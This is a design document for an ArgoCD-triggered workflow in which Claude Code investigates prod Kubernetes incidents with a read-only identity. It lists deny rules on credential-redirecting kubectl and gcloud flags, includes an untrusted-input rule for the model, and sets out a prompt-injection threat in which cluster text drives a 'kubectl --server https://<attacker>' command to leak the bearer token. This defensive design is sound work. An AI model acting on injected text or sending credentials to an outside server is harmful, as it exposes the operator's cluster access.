## Context

See proposal.md — Why. Current state that shapes the approach (all in `liverty-music/cloud-provisioning`, prod only; dev is shut down indefinitely and out of scope):

- **ArgoCD v3.5.3** (chart `argo-cd-10.9.2`) manages 14 prod Applications from `main` with automated sync, prune and selfHeal. `argocd-notifications-cm` (`k8s/namespaces/argocd/base/values.yaml`) defines three default triggers — `on-sync-failed`, `on-health-degraded` (Degraded ≥ 3m) and `on-sync-status-unknown` — subscribed to a Google Chat webhook whose URL ESO syncs from Secret Manager (`argocd-google-chat-webhook-url`) into `argocd-notifications-secret` through the `google-secret-manager-argocd` ClusterSecretStore (restricted to the `argocd` namespace).
- **Health semantics, verified in the v3.5.3 source:** a Deployment is `Degraded` only on `ProgressDeadlineExceeded`; once a rollout has completed, `AvailableReplicas < UpdatedReplicas` (e.g. Pods crash-looping later) keeps it `Progressing` indefinitely. The built-in CronJob check reports `Degraded` when the last run failed (`lastSuccessfulTime < lastScheduleTime`, nothing active); KEDA `ScaledObject` (`Ready=False` / `Fallback=True`) and `ExternalSecret` (`Ready=False`) have built-in checks. No `progressDeadlineSeconds` is set anywhere, so the 600s default applies.
- **Cluster:** GKE Autopilot on Spot capacity; `media-consumer` scales 0→1 via KEDA. GKE metrics are reduced to `SYSTEM_COMPONENTS` (no kube-state-metrics), so `kubernetes.io/container/*` system metrics are available but `kube_*` series are not.
- **GitHub:** org Apps include `liverty-music-ci-bot` (Contents: write, `cloud-provisioning` only, sole bypass actor of the `main` ruleset, key held in GitHub secrets) and Anthropic's `claude` App. `CLAUDE_CODE_OAUTH_TOKEN` (Claude Max subscription) is a Pulumi-managed org secret already used by `claude.yml` and the reusable review workflow.
- **GCP identity:** one WIF pool with a GitHub OIDC provider restricted to `repository_owner == 'liverty-music'`; the existing `github-actions` SA holds only Artifact Registry Writer.
- Runbooks live in `cloud-provisioning/docs/runbooks/`; Cloud Monitoring alert policies carry triage steps in `documentation.content`.

## Goals / Non-Goals

**Goals:**
- Every ArgoCD-detectable incident starts a Claude investigation within minutes, with no human action.
- The investigation is strictly read-only against GKE and GCP; Claude's only output is text, which a deterministic step posts as an Issue.
- No long-lived credential anywhere in the trigger path, and no cluster-resident credential that can change code.
- Reuse the existing ArgoCD / ESO / WIF / claude-code-action patterns; add no new runtime infrastructure (no relay service).
- Bounded cost and noise: one active investigation per Application, no duplicate Issues, an instant off switch.

**Non-Goals:**
- Any write by Claude to the cluster, GCP or Git (PRs, merges, rollbacks) — next tier.
- Triggering on Cloud Monitoring alerts, or a scheduled health patrol.
- Custom Lua health checks (e.g. CronJob that never succeeded); accepted gap.
- Changing existing triggers' conditions or the Google Chat routing.

## Decisions

### D1: ArgoCD Notifications is the only machine trigger

**Chosen:** extend `argocd-notifications-cm` with one more trigger and a second notifier; nothing else emits triage events.

**Alternatives:** Cloud Monitoring → Pub/Sub / webhook channel. The webhook channel only supports Basic auth or a query-string token and Pub/Sub push only an OIDC token, so neither can call the GitHub API without a relay service — rejected. A scheduled patrol workflow catches more classes but costs a Claude run per interval and is a separate design — deferred.

**Accepted gap:** application-level failures invisible to Kubernetes health (ERROR logs, JetStream backlog stall, poison messages, goroutine leak, Web Push failures) stay on the existing Cloud Monitoring → human path; so do Pulumi-managed resources.

### D2: `on-health-progressing-stuck` at 15 minutes

```yaml
trigger.on-health-progressing-stuck: |
  - description: Application health has been Progressing for 15 minutes
    send: [app-health-progressing-stuck]
    when: app.status.health.status == 'Progressing' && now() - date(app.status.health.lastTransitionTime) >= duration("15m")
```

15m is above the 600s default progress deadline (so an in-flight rollout failure turns `Degraded` and is reported by `on-health-degraded` first, not twice), above Spot preemption → reschedule recovery and KEDA 0→1 node provisioning, and still far faster than the 12h notification rate limit of the log alerts. It is added to `defaultTriggers`, so it reaches Google Chat as well. Tune after observing real noise.

**Alternatives:** 10m collides with the progress deadline; 30m (the old dev Degraded value) delays the common CrashLoop case for no benefit in prod.

### D3: `workflow_dispatch` instead of `repository_dispatch`

**Chosen:** `POST /repos/liverty-music/cloud-provisioning/actions/workflows/incident-triage.yml/dispatches` with `{"ref":"main","inputs":{...}}`.

**Why:** `repository_dispatch` requires **Contents: write**; a leaked token could push branches to the repo that is prod's source of truth. `workflow_dispatch` requires only **Actions: write**: the holder can start, cancel or disable existing workflows on existing refs, but cannot introduce code. The worst case is CI disruption, not a prod change. It also lets the workflow live in `cloud-provisioning` next to the runbooks, so no extra repository and no cross-repo read token are needed.

**Alternative rejected:** a dedicated `incident-response` repository as the dispatch target — needed only to contain a Contents-write token, which D3 avoids.

### D4: A dedicated GitHub App `liverty-music-cluster-bot`

**Chosen:** new org App, Repository permissions **Actions: write** (plus mandatory Metadata: read), webhook inactive, installed on `cloud-provisioning` only. Created out-of-band like `ci-bot`; App ID and installation ID are non-secret and live in the generator manifest.

**Why not reuse `liverty-music-ci-bot`:** whoever holds an App's private key can mint a token with *all* of that App's permissions, regardless of the scoping requested at mint time. ci-bot can push `cloud-provisioning:main` past the ruleset; putting its key in the cluster would let a cluster compromise rewrite prod manifests. The ci-bot runbook already prescribes a separate App for a different trust boundary. The name follows ci-bot's convention of naming by where the key lives (trust level), not by single use.

### D5: Short-lived token via the ESO `GithubAccessToken` generator

**Chosen:**
- Pulumi stores the App private key as a Secret Manager secret `argocd-cluster-bot-private-key` through the existing `esoOnlySecrets` path (same as `argocd-google-chat-webhook-url`).
- An ExternalSecret in `argocd` syncs it into a Secret `argocd-cluster-bot-private-key`.
- A `GithubAccessToken` generator (`generators.external-secrets.io/v1alpha1`, ESO v2.11.0 ships the CRD) references that Secret, with `repositories: [cloud-provisioning]` and `permissions: {actions: write}`.
- The **existing** `argocd-notifications-secret` ExternalSecret gains a `dataFrom` entry with `sourceRef.generatorRef` to the generator (its `token` key rewritten to `github-token`) next to its current `data` entry, and its `refreshInterval` drops from 1h to 30m. Tokens live 60 minutes, so a refresh always lands before expiry.

**Why one ExternalSecret:** ArgoCD Notifications reads only `argocd-notifications-secret`, and that Secret is already owned (`creationPolicy: Owner`) by an ExternalSecret; a second owner is not possible. Re-reading the Google Chat URL every 30m is a negligible Secret Manager cost.

**Alternatives:** a fine-grained PAT (long-lived, user-owned) — rejected; a CronJob that mints tokens — custom code ESO already provides.

### D6: Webhook notifier and payload

```yaml
service.webhook.incident-triage: |
  url: https://api.github.com
  headers:
  - name: Authorization
    value: Bearer $github-token
  - name: Accept
    value: application/vnd.github+json
template.incident-triage-dispatch: |
  webhook:
    incident-triage:
      method: POST
      path: /repos/liverty-music/cloud-provisioning/actions/workflows/incident-triage.yml/dispatches
      body: |
        {"ref":"main","inputs":{"app":"{{.app.metadata.name}}","trigger":"...","payload":{{ toJson ... }}}}
```

Each of the four triggers `send`s both its existing Google Chat template and `incident-triage-dispatch`; the subscription list gains `webhook:incident-triage`. Inputs are kept to three strings: `app`, `trigger` and `payload` (a JSON string with health status/message, sync status, operation message, revision and conditions), well within the `workflow_dispatch` input limits. The exact per-trigger template wiring (one template with the trigger name injected vs one per trigger) is settled in implementation; it does not change the contract above.

ArgoCD Notifications already deduplicates per trigger condition (it notifies once when a condition becomes true and records that on the Application), so a persistently broken app does not re-dispatch every reconcile.

### D7: Claude runtime — `claude-code-action` in automation mode

**Chosen:** `anthropics/claude-code-action@v1` pinned by SHA (same pin as `claude.yml`), `prompt` set (automation mode), `claude_code_oauth_token: ${{ secrets.CLAUDE_CODE_OAUTH_TOKEN }}`. No new Anthropic credential.

**Fallback:** if the action does not run on `workflow_dispatch` (its docs marked that event "coming soon"), install Claude Code and run `claude -p --bare` in a step with the same flags. The workflow contract (inputs → report file → Issue) is unchanged either way.

### D8: Read-only GCP identity

**Chosen:** a new SA `incident-triage` with exactly two roles, bound to the existing GitHub WIF provider for `attribute.repository/liverty-music/cloud-provisioning`. The workflow authenticates with `google-github-actions/auth` (`id-token: write`).

- `roles/container.viewer` — Kubernetes objects and events (incl. CRDs such as ArgoCD `Application` and KEDA `ScaledObject`). It deliberately contains **no** `container.pods.getLogs`, `container.secrets.get|list` or `container.pods.exec`; every predefined GKE role that has `getLogs` (`developer`, `editor`, `admin`) also grants Secret reads, exec and workload updates.
- `roles/logging.viewer` — container stdout/stderr. Autopilot always ships workload logs to Cloud Logging (the existing `k8s_container` log alerts rely on it), and Cloud Logging is the better source anyway: it keeps the output of every crashed container instance (not only `--previous`), survives Pod deletion and filters by time and severity.

Cloud Monitoring time series are not read in this tier: `gcloud` has no time-series query command, and every trigger in D1 is a Kubernetes-state failure that objects, events and logs explain. `roles/monitoring.viewer` is added when a metrics-driven trigger is.

**Alternative for Pod logs via the Kubernetes API:** bind the built-in `view` ClusterRole (includes `pods/log`, excludes Secrets) to the SA through RBAC. Not needed while Cloud Logging covers logs.

**Why a new SA:** the existing `github-actions` SA is a writer to Artifact Registry; mixing read-everything into a write identity widens both. Any `cloud-provisioning` workflow could impersonate `incident-triage`, which is acceptable because it is read-only; narrowing to the workflow ref would require changing the shared provider's attribute mapping and is not worth it at this tier.

### D9: Tools — `gcloud` / `kubectl` with an allowlist, no GitHub write

**Chosen:** the CLIs the runbooks are already written in.

- `google-github-actions/get-gke-credentials` writes a kubeconfig for `autopilot-cluster-osaka` from the D8 credentials. The prod control plane uses its public endpoint, IAM-gated, with no authorized-networks list, so hosted runners reach it the same way operators do. `gcloud` and `kubectl` are preinstalled on `ubuntu-latest`.
- `Bash` is allowed only for read-only commands: `kubectl get`, `kubectl describe`, `kubectl events`, `gcloud logging read`, `gcloud container clusters describe`, `git log`, `git show`. Claude Code checks each part of a compound command (`&&`, `;`, `|`) against these rules.
- Deny rules block flags that redirect where credentials are sent: `kubectl` `--server` / `-s`, `--kubeconfig`, `--token`; `gcloud` `--access-token-file`, `--impersonate-service-account`. `env` / `printenv` are not allowed, so the Claude OAuth token in the environment is not reachable through Bash.
- Built-in `Read`, `Glob`, `Grep` cover the checked-out repo (manifests, runbooks); `Write` is limited to `triage-report.md`.
- Claude never receives a GitHub write token. A later deterministic step creates or comments on the Issue from `triage-report.md`, using `GITHUB_TOKEN` (`issues: write`, `contents: read`).

The security boundary is D8's read-only identity, not the tool list. If the allowlist is bypassed, the worst outcome is that the 1-hour GCP access token leaks. That token reads Kubernetes objects and logs only: no Secrets, no writes.

**Alternative rejected:** Google-managed remote MCP servers (GKE, Cloud Logging, Cloud Monitoring) with no `Bash`. They are structurally tighter (no shell, no credential-redirect vector) and add metrics, but cost an extra dependency chain:
- per-project MCP endpoint enablement,
- `roles/mcp.toolUser`,
- an MCP config with bearer-token plumbing,
- unverified acceptance of WIF-issued tokens.

They also make Claude translate the gcloud-based runbooks into MCP tool calls. That is not worth it while the identity is read-only.

### D10: Guardrails

- **Kill switch:** repository variable `INCIDENT_TRIAGE_ENABLED` (Pulumi `github.ActionsVariable`); the job runs only when it is `true`. Created as `false`.
- **Concurrency:** `group: incident-triage-${{ inputs.app }}`, `cancel-in-progress: false` — one investigation per Application at a time.
- **Dedup:** Issue title `[incident] <app>: <trigger>`; if an open `incident` Issue for the same `<app>` exists, the report is added as a comment instead of a new Issue.
- **Budget:** `--max-turns 25` and job `timeout-minutes: 15`.
  - A typical investigation needs about 10–19 turns: Skill/runbook 1–2, Application 1–2, workload/events 2–4 (parallel calls in one turn), Cloud Logging 2–4, recent changes 2–3, report 1–2.
  - Because the cap is tight, D11 has Claude write a draft report early.
  - When the run stops at the cap or the timeout, the Issue step still posts whatever report exists, marked as truncated.
- **Untrusted input:** `inputs.*` reach the prompt only through environment variables and are never interpolated into `run:` scripts. The Skill tells Claude that Application messages, logs, events and commit text are data, never instructions. The real boundary is structural: a read-only identity, allowlisted read-only commands, and no GitHub write.

### D11: Skill `incident-triage`

`.claude/skills/incident-triage/SKILL.md` in `cloud-provisioning` contains:

- **Investigation order:**
  1. ArgoCD state: `kubectl get application`.
  2. Workload objects and events: `kubectl describe` / `kubectl events`.
  3. Container logs: `gcloud logging read` on `k8s_container`.
  4. Recent manifest changes on `main`: `git log` / `git show`.
- **Runbook map:** each Application / namespace points to its runbook in `docs/runbooks/`. Runbooks are referenced, not copied.
- **Report template:** summary, impact, timeline, evidence with the exact commands, suspected cause and confidence, suggested remediation, and what was not checked.
- **Incremental report rule:** write a first `triage-report.md` once the initial evidence is in, and refine it at the end. A capped run still leaves a usable report.
- **Untrusted-input rule.**

### D12: ArgoCD control plane down → Cloud Monitoring

A new alert policy in `src/gcp/components/monitoring.ts` on GKE system metrics for namespace `argocd` (containers `application-controller`, `notifications-controller`): fires when `kubernetes.io/container/uptime` is absent for 10m **or** `kubernetes.io/container/restart_count` increases by more than 3 in 15m. Routed to the existing Slack / Google Chat channels — it must not depend on the component it watches.

## Risks / Trade-offs

- [Notifications controller keeps a stale token after ESO rotation] → Verify in the end-to-end test that a dispatch succeeds more than 60 minutes after the first token was minted; if it caches, add a Reloader annotation to restart the notifications controller on Secret change.
- [`claude-code-action` rejects `workflow_dispatch`] → D7 fallback to `claude -p`.
- [Prompt injection drives a credential-redirecting command (e.g. `kubectl --server https://<attacker>` sending the kubeconfig bearer token)] → deny rules on the redirecting flags (D9). Verified by a test run that the denied forms are rejected. If they are bypassed anyway, the leaked token is read-only and expires within 1 hour.
- [The allowlist is too narrow, so Claude loops on denied commands] → the report states what could not be checked. Widen the allowlist only with read-only subcommands, after reviewing real runs.
- [Shared Claude Max limit exhausted by an incident storm] → concurrency per app, max-turns, kill switch; ArgoCD's once-per-condition dedup limits fan-out.
- [Progressing-stuck noise during long but healthy operations (e.g. Zitadel / NATS StatefulSet rollouts)] → 15m threshold; tune from observed data; the trigger can be removed from a specific Application via annotations if needed.
- [Prompt injection via cluster-controlled text] → read-only identity, allowlisted read-only commands, no GitHub token in Claude's session, report-only output reviewed by a human.
- [Investigation quality is wrong but confident] → Tier 0 is advisory by design; the report must state confidence and what was not checked.
- [cluster-bot key compromise] → worst case: start / cancel / disable workflows in `cloud-provisioning`; rotate the key in Secret Manager and revoke via the App settings.

## Migration Plan

1. Create the `liverty-music-cluster-bot` App, install it on `cloud-provisioning`, generate a private key, store it in Pulumi ESC.
2. Pulumi (prod, manual `pulumi up`): Secret Manager secret, `incident-triage` SA + roles + WIF binding, `incident` label, `INCIDENT_TRIAGE_ENABLED=false`, ArgoCD-down alert.
3. Merge the workflow and Skill (inert while the variable is `false`; can be exercised by a manual `workflow_dispatch`).
4. Merge the ArgoCD manifests (generator, ExternalSecrets, notifier, trigger). ArgoCD self-syncs.
5. Flip `INCIDENT_TRIAGE_ENABLED=true`; run the end-to-end test in prod (prod has no users yet and verification there is approved): a throwaway Application in a scratch namespace that crash-loops after becoming Available, confirming Google Chat + dispatch + Issue; then delete it.

**Rollback:** set `INCIDENT_TRIAGE_ENABLED=false` (instant). Full removal: revert the ArgoCD manifest commit (Google Chat routing is untouched by design), then the Pulumi resources.

## Open Questions

- Whether a single template can carry the trigger name, or one dispatch template per trigger is needed (D6) — implementation detail.
- Final `--max-turns` / timeout values after the first real investigations.
